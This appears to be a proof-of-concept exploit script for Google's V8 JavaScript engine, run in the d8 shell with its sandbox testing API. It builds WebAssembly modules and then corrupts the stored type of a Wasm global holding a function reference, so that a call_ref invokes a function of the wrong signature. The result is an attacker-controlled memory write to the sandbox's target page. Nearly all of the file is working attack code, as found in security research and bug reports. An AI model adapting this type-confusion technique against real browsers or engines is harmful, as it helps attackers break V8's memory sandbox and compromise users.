 
d8.file.execute("/home/vult/Desktop/v8-wasm/v8/test/mjsunit/wasm/wasm-module-builder.js");

let builder0 = new WasmModuleBuilder();
let $struct = builder0.addStruct([makeField(kWasmI64, true)]);
let $sig_v_ls = builder0.addType(makeSig([kWasmI64, wasmRefType($struct)], []));
let $sig_v_ll = builder0.addType(makeSig([kWasmI64, kWasmI64], []));

builder0.addFunction("write", $sig_v_ls)
  .addBody([
      kExprLocalGet, 1,
    kExprLocalGet, 0,
    kGCPrefix, kExprStructSet, $struct, 0,
  ]).exportAs("write");

builder0.addFunction("dummy", $sig_v_ll)
  .addBody([
  ]).exportAs("dummy");


let instance0 = builder0.instantiate();
let { write, dummy } = instance0.exports;

 
let builder = new WasmModuleBuilder();
let $sig_v_ll_1 = builder.addType(makeSig([kWasmI64, kWasmI64], []));
let $struct1 = builder.addStruct([makeField(kWasmI64, true)]);
let $sig_v_ls_1 = builder.addType(makeSig([kWasmI64, wasmRefType($struct1)], []));
const g1 = builder.addGlobal(kWasmExternRef, true, false).exportAs("global1");
const g2 = builder.addGlobal(kWasmAnyFunc, true, false).exportAs("global2");
builder.addGlobal(kWasmI32, true, false); // Dummy.
builder.addGlobal(kWasmExternRef, true, false); // Dummy.
const g3 = builder.addGlobal(kWasmExternRef, true, false).exportAs("global3");
const g4 = builder.addGlobal(kWasmAnyFunc, true, false).exportAs("global4");

builder.addFunction("main",
makeSig([kWasmExternRef, kWasmAnyFunc, kWasmExternRef, kWasmAnyFunc], []))
.addBody([
    kExprLocalGet, 0,
    kExprGlobalSet, g1.index,
    kExprLocalGet, 1,
    kExprGlobalSet, g2.index,
    kExprLocalGet, 2,
    kExprGlobalSet, g3.index,
    kExprLocalGet, 3,
    kExprGlobalSet, g4.index
])
.exportAs("main");

let nop = builder.addFunction("nop", $sig_v_ll_1)
    .addBody([
    ]).exportAs("nop");

const g5 = builder.addGlobal(wasmRefType($sig_v_ll_1), true, false, [kExprRefFunc, nop.index]).exportAs("global5");

builder.addFunction("boom", $sig_v_ll_1)
    .addBody([
        kExprLocalGet, 1,
        kExprLocalGet, 0,
        kExprGlobalGet, g5.index,
        kExprCallRef, $sig_v_ll_1, // call_ref
    ]).exportAs("boom");


const instance = builder.instantiate();
const obj1 = { x: 221 };
const func2 = dummy;
const obj3 = print;
const func4 = dummy;
instance.exports.main(obj1, func2, obj3, func4);
let { global1, global2, global3, global4, global5, boom } = instance.exports;
%DebugPrint(global2);
%DebugPrint(global4);
%DebugPrint(global5);
// %SystemBreak();



// Prepare corruption utilities.
const kHeapObjectTag = 1;
let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
function getPtr(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}
function getField(obj, offset) {
  return memory.getUint32(obj + offset - kHeapObjectTag, true);
}
function setField(obj, offset, value) {
  memory.setUint32(obj + offset - kHeapObjectTag, value, true);
}


const kRef = 9;
const kSmiTagSize = 1;
const kHeapTypeShift = 5;
let global5_ptr = getPtr(global5);
let raw_type = getField(global5_ptr, 0x1c);
let new_type = (($sig_v_ls_1 << kHeapTypeShift) | kRef )<< kSmiTagSize;

setField(global5_ptr, 0x1c, new_type);
global5.value = write;
%DebugPrint(global5);

// %WasmTierUpFunction(boom);

console.log(boom(BigInt(Sandbox.targetPage) - 0x7n, 0x41n));

